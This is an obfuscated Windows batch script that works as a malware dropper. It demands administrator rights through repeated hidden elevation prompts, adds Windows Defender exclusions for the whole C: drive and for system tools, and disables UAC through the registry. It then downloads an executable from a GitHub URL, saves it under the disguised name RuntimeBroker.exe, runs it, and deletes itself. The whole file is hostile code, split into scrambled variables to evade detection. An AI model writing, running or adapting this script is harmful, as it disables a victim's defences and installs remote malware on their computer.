@echo off & setlocal enableDelayedExpansion
set "jENo=NET" & set "BUXt=>nul" & set "xfVHc=2>&1" & set "inkWG=SESSION"
%jENo% %inkWG% %BUXt% %xfVHc%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "llVz=bar" & set "BeF=qux" & set "sBR=foo" & set "PTTw=baz" & rem YpfpANG fffoUXC LQFQz
set "eqrQC=powershell -ExecutionPolicy Bypass -Command"
set "TDW=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "yneVN='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "NsPEc='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!eqrQC! "!TDW! !yneVN! !NsPEc!" %BUXt% %xfVHc%
set "CKFhC=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "Pko=-Name 'EnableLUA' -Value 0"
!eqrQC! "!CKFhC! !Pko!" %BUXt% %xfVHc%
set "QSW=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!eqrQC! "!QSW!" %BUXt% %xfVHc%
if !errorlevel! neq 0 (goto %a%)
set "qjb=timeout /t" & !qjb! 2 %BUXt% %xfVHc%
set "XeH=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "nTqE=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "WYaL=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!eqrQC! "!XeH! !nTqE! !WYaL!" %BUXt% %xfVHc%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!qjb! 1 %BUXt% %xfVHc% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %BUXt% %xfVHc%
del /f /q "%~f0" %BUXt% %xfVHc%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %BUXt% %xfVHc%
if !errorlevel! neq 0 (!qjb! 3 %BUXt% %xfVHc% & goto %b%)
exit /b
